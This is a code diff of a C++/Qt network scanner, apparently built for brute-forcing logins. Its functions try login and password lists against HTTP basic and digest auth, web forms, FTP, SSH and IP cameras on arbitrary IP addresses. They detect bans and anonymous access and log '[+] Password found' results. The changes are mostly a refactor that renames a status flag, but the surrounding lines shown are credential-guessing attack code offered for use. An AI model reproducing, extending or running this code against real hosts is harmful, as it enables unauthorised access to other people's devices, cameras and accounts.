@@ -3,6 +3,8 @@
 #include <libssh/libssh.h>
 #include <sstream>
 #include <openssl/md5.h>
+#include "externFunctions.h"
+#include "externData.h"
 #pragma once
 
 #if defined(Q_OS_WIN32)
@@ -12,7 +14,6 @@
 #endif
 int gMaxBrutingThreads = 200;
 
-volatile bool BConnLocked = false;
 void BConInc()
 {
 	__asm
@@ -34,7 +35,6 @@ void BConDec()
 	stt->doEmitionChangeBA(QString::number(BrutingThrds));
 #pragma endregion
 };
-bool SSHConnLocked = false;
 void SSHConInc()
 {
 	__asm
@@ -113,7 +113,7 @@ int recvWT(
 		} 
 		return(n) ; /* trouble */ 
 }
-string toLowerStr(const char *str)
+std::string toLowerStr(const char *str)
 {
 	int tsz = strlen(str);
 	if(tsz == 1)
@@ -133,7 +133,7 @@ string toLowerStr(const char *str)
 
 		memset(strr + tsz, '\0', 1);
 
-		string tstr = strr;
+		std::string tstr = strr;
 		delete []strr;
 		return tstr;
 	};
@@ -410,7 +410,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
 		else
 		{
-			OnLiner = 0;
+			isActive = 0;
 			strcpy(lps.login, "UNKNOWN");
 			return lps;
 		};
@@ -419,7 +419,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
 		else
 		{
-			OnLiner = 0;
+			isActive = 0;
 			strcpy(lps.login, "UNKNOWN");
 			return lps;
 		};
@@ -445,7 +445,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 #pragma endregion
 	if(strlen(headerMsg) == 0)
 	{
-		OnLiner = 0;
+		isActive = 0;
 
 		strcpy(lps.login, "UNKNOWN");
 		return lps;
@@ -463,7 +463,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 			closesocket(sock);
 
 			strcpy(lps.other, "[400 Bad Request]");
-			OnLiner = 0;
+			isActive = 0;
 			return lps;
 		}
 		else if(strstri(headerMsg, "404 Not") != NULL 
@@ -485,7 +485,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				closesocket(sock);
 
 				strcpy(lps.other, QString("[404 Not Found (" + QString(path) + ")]").toLocal8Bit().data());
-				OnLiner = 0;
+				isActive = 0;
 				return lps;
 			};
 		}
@@ -511,7 +511,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 
 			strcpy(lps.login, "NULL");
 			strcpy(lps.pass, "NULL");
-			OnLiner = 0;
+			isActive = 0;
 			return lps;
 		};
 	};
@@ -520,7 +520,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	closesocket(sock);
 #pragma endregion
 
-	OnLiner = 1;
+	isActive = 1;
 	char tPass[256] = {0};
 	char curLogin[256] = {0};
 	char curPass[256] = {0};
@@ -542,7 +542,8 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 	char realm[512] = {0};
 	char opaque[512] = {0};
 	char qop[64] = {0};
-	string encoded = "";
+	std::string encoded = "";
+
 	for(int i = 0; i < MaxLogin; i++)
 	{
 		if(globalScanFlag == false) break;
@@ -679,7 +680,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 
 						shutdown(sock, SD_BOTH);
 						closesocket(sock);
-						OnLiner = 0;
+						isActive = 0;
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
 					}
@@ -695,7 +696,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					shutdown(sock, SD_BOTH);
 					closesocket(sock);
 
-					OnLiner = 0;
+					isActive = 0;
 
 					strcpy(lps.login, "UNKNOWN");
 					return lps;
@@ -752,7 +753,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 #pragma region QTGUI_Area
 				stt->doEmitionRedFoundData("[-] 404 - Wrong path detected. (" + QString(ip) + ":" + QString::number(port) + QString(path) + ")");
 #pragma endregion
-				OnLiner = 0;
+				isActive = 0;
 				strcpy(lps.login, "UNKNOWN");
 				return lps;
 			}
@@ -776,7 +777,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 					strcpy(pass, ip);
 					strcat(pass, " - Password found: ");
 					strcat(pass, tPass);
-					OnLiner = 0;
+					isActive = 0;
 					stt->doEmition_BAGreenData("[+] " + QString(pass));
 					strcpy(lps.login, curLogin);
 					strcpy(lps.pass, curPass);
@@ -789,7 +790,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 				strcpy(pass, ip);
 				strcat(pass, " - Password found: ");
 				strcat(pass, tPass);
-				OnLiner = 0;
+				isActive = 0;
 				char *pt1 = strstr(recvBuff, " ");
 				if(pt1 != NULL)
 				{
@@ -820,7 +821,7 @@ lopaStr _BABrute(char *cookie, char *ip, int port, char *pathT, char *method)
 		};
 	};
 #pragma endregion
-	OnLiner = 0;
+	isActive = 0;
 
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
@@ -900,7 +901,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 				loginFailedFlag = 0;
 			};
 
-			OnLiner = 1;
+			isActive = 1;
 
 			if(connectionResult != SOCKET_ERROR) 
 			{
@@ -921,7 +922,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 					{
 						shutdown(sockFTP, SD_BOTH);
 						closesocket(sockFTP);
-						OnLiner = 0;
+						isActive = 0;
 						stt->doEmition_BARedData("[*] Unknown protocol (451 Error) - " + QString(ip));
 						strcpy(lps.other, "Unknown protocol (451 Error)");
 						return lps;
@@ -931,7 +932,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 					{
 						shutdown(sockFTP, SD_BOTH);
 						closesocket(sockFTP);
-						OnLiner = 0;
+						isActive = 0;
 #pragma region QTGUI_Area
 						stt->doEmition_BAGreenData("[*] Anonymous access detected - " + QString(ip));
 #pragma endregion
@@ -947,7 +948,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						shutdown(sockFTP, SD_BOTH);
 						closesocket(sockFTP);
 
-						OnLiner = 0;
+						isActive = 0;
 
 #pragma region QTGUI_Area
 						stt->doEmition_BARedData("[-] 550 (No connections allowed) - Ban detected. Dropping " + QString(ip));
@@ -962,7 +963,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 						shutdown(sockFTP, SD_BOTH);
 						closesocket(sockFTP);
 
-						OnLiner = 0;
+						isActive = 0;
 						stt->doEmition_BARedData("[-] 500 (Sorry, no such command) " + QString(ip));
 						strcpy(lps.other, "[500 Sorry, no such command]");
 						return lps;
@@ -1061,7 +1062,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 							shutdown(sockFTP, SD_BOTH);
 							closesocket(sockFTP);
 
-							OnLiner = 0;
+							isActive = 0;
 
 							strcpy(lps.login, "UNKNOWN");
 							return lps;
@@ -1129,7 +1130,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 								strcpy(lps.login, loginLst[i]);
 								strcpy(lps.pass, passLst[j]);
 								strcpy(lps.other, "ROUTER");
-								OnLiner = 0;
+								isActive = 0;
 								return lps;
 							};
 
@@ -1180,7 +1181,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 												shutdown(newSockFTP, SD_BOTH);
 												closesocket(newSockFTP);
 												closedSocket = 1;			
-												OnLiner = 0;
+												isActive = 0;
 												strcpy(lps.login, "UNKNOWN");
 												return lps;
 											}
@@ -1219,7 +1220,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 
 							shutdown(sockFTP, SD_BOTH);
 							closesocket(sockFTP);
-							OnLiner = 0;
+							isActive = 0;
 							return lps;
 						}
 						else
@@ -1231,7 +1232,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 
 							shutdown(sockFTP, SD_BOTH);
 							closesocket(sockFTP);
-							OnLiner = 0;
+							isActive = 0;
 							return lps;
 						};
 					};
@@ -1264,7 +1265,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 
 				shutdown(sockFTP, SD_BOTH);
 				closesocket(sockFTP);		
-				OnLiner = 0;
+				isActive = 0;
 				strcpy(lps.login, "UNKNOWN");
 				return lps;
 			};
@@ -1279,7 +1280,7 @@ lopaStr _FTPBrute(char *ip, int port, PathStr *ps)
 	};
 	shutdown(sockFTP, SD_BOTH);
 	closesocket(sockFTP);
-	OnLiner = 0;
+	isActive = 0;
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
 };
@@ -1665,7 +1666,6 @@ int Connector::_EstablishConnection(char *ip, int port, char *requesth, conSTR *
 			++offlines;
 			char temp[128] = {0};
 			int err = iError;
-			GlobalWSAErr = err;
 			if(err == 10055) 
 			{
 				strcpy(temp, "-Connection pool depleted- ");
@@ -1818,14 +1818,14 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 					if(strstri(CSTR.lowerBuff, "501 not implemented") != NULL)
 					{
 						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");						
-						OnLiner = 0;
+						isActive = 0;
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
 					};
 					if(strstri(CSTR.lowerBuff, "404 not found") != NULL)
 					{
 						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");						
-						OnLiner = 0;
+						isActive = 0;
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
 					};
@@ -1857,7 +1857,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 						{
 							ZeroMemory(request, sizeof(request));
 
-							OnLiner = 0;
+							isActive = 0;
 
 							strcpy(lps.login, "UNKNOWN");
 							return lps;
@@ -1870,7 +1870,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 						strcat(pass, wfLoginLst[i]);
 						strcat(pass, ":");
 						strcat(pass, wfPassLst[j]);
-						OnLiner = 0;
+						isActive = 0;
 #pragma region QTGUI_Area
 						stt->doEmition_BAGreenData("[+] " + QString(pass));
 #pragma endregion
@@ -1883,7 +1883,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 				{
 					ZeroMemory(request, sizeof(request));
 
-					OnLiner = 0;
+					isActive = 0;
 
 					strcpy(lps.login, "UNKNOWN");
 					return lps;
@@ -1944,14 +1944,14 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 					if(strstri(CSTR.lowerBuff, "501 not implemented") != NULL)
 					{
 						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");						
-						OnLiner = 0;
+						isActive = 0;
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
 					};
 					if(strstri(CSTR.lowerBuff, "404 not found") != NULL)
 					{
 						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");						
-						OnLiner = 0;
+						isActive = 0;
 						strcpy(lps.login, "UNKNOWN");
 						return lps;
 					};
@@ -1982,7 +1982,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 							ZeroMemory(request, sizeof(request));
 							ZeroMemory(argData, sizeof(argData));
 
-							OnLiner = 0;
+							isActive = 0;
 
 							strcpy(lps.login, "UNKNOWN");
 							return lps;
@@ -1995,7 +1995,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 						strcat(pass, wfLoginLst[i]);
 						strcat(pass, ":");
 						strcat(pass, wfPassLst[j]);
-						OnLiner = 0;
+						isActive = 0;
 #pragma region QTGUI_Area
 						stt->doEmition_BAGreenData("[+] " + QString(pass));
 #pragma endregion
@@ -2009,7 +2009,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 					ZeroMemory(request, sizeof(request));
 					ZeroMemory(argData, sizeof(argData));
 
-					OnLiner = 0;
+					isActive = 0;
 
 					strcpy(lps.login, "UNKNOWN");
 					return lps;
@@ -2029,7 +2029,7 @@ lopaStr _WFBrut(char *cookie, char *ip, int port, char *methodVal, char *actionV
 	ZeroMemory(request, sizeof(request));
 	ZeroMemory(argData, sizeof(argData));
 
-	OnLiner = 0;
+	isActive = 0;
 
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
@@ -2143,7 +2143,7 @@ int _EstablishSSHConnection(char *host, int port, conSTR *CSTR, char *banner)
 	char login[32] = {0};
 	char pass[32] = {0};
 	char temp[64] = {0};
-	OnLiner = 1;
+	isActive = 1;
 	SSHConInc();
 	int sz = 0;
 	char *ptr1 = 0;
@@ -2163,19 +2163,19 @@ int _EstablishSSHConnection(char *host, int port, conSTR *CSTR, char *banner)
 		if(res == 0) 
 		{
 			SSHConDec();
-			OnLiner = 0;
+			isActive = 0;
 			return 0;
 		}
 		else if(res == -2)
 		{
 			SSHConDec();
-			OnLiner = 0;
+			isActive = 0;
 			return -2;
 		};
 		Sleep(500);
 	};
 	SSHConDec();
-	OnLiner = 0;
+	isActive = 0;
 	return -1;
 };
 #pragma endregion
@@ -2285,7 +2285,7 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 	char login[128] = {0};
 	char pass[128] = {0};
 	char request[1024] = {0};
-	OnLiner = 1;
+	isActive = 1;
 	int passCounter = 1;
 
 	std::vector<char*> negVector;
@@ -2320,7 +2320,7 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 	else
 	{
 		stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
-		OnLiner = 0;
+		isActive = 0;
 		strcpy(lps.login, "UNKNOWN");
 		return lps;
 	};
@@ -2407,21 +2407,21 @@ lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
 
 			if(res == 1)
 			{
-				OnLiner = 0;
+				isActive = 0;
 				strcpy(lps.login, loginLst[i]);
 				strcpy(lps.pass, passLst[j]);
 				return lps;
 			}
 			else if(res == -1)
 			{
-				OnLiner = 0;
+				isActive = 0;
 				strcpy(lps.login, "UNKNOWN");
 				return lps;
 			};
 			++passCounter;
 		};
 	};
-	OnLiner = 0;
+	isActive = 0;
 	strcpy(lps.login, "UNKNOWN");
 	return lps;
 };
